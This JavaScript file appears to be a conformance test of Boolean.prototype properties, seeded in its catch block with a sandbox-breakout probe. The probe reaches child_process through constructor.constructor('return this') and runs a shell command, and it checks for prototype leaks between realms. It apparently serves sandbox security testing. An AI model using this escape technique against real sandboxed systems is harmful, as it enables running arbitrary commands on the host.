try {
    if (typeof Boolean.prototype !== 'object')
        $ERROR('#1: typeof Boolean.prototype === "object". Actual: ' + typeof Boolean.prototype);
    if (typeof Boolean['prototype'] !== 'object')
        $ERROR('#2: typeof Boolean["prototype"] === "object". Actual: ' + typeof Boolean['prototype']);
    if (typeof Boolean.constructor !== 'function')
        $ERROR('#3: typeof Boolean.constructor === "function". Actual: ' + typeof Boolean.constructor);
    if (typeof Boolean['constructor'] !== 'function')
        $ERROR('#4: typeof Boolean["constructor"] === "function". Actual: ' + typeof Boolean['constructor']);
    if (typeof Boolean.prototype.valueOf !== 'function')
        $ERROR('#5: typeof Boolean.prototype.valueOf === "function". Actual: ' + typeof Boolean.prototype.valueOf);
    if (typeof Boolean.prototype['valueOf'] !== 'function')
        $ERROR('#6: typeof Boolean.prototype["valueOf"] === "function". Actual: ' + typeof Boolean.prototype['valueOf']);
    if (typeof Boolean.prototype.toString !== 'function')
        $ERROR('#7: typeof Boolean.prototype.toString === "function". Actual: ' + typeof Boolean.prototype.toString);
    if (typeof Boolean.prototype['toString'] !== 'function')
        $ERROR('#8: typeof Boolean.prototype["toString"] === "function". Actual: ' + typeof Boolean.prototype['toString']);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}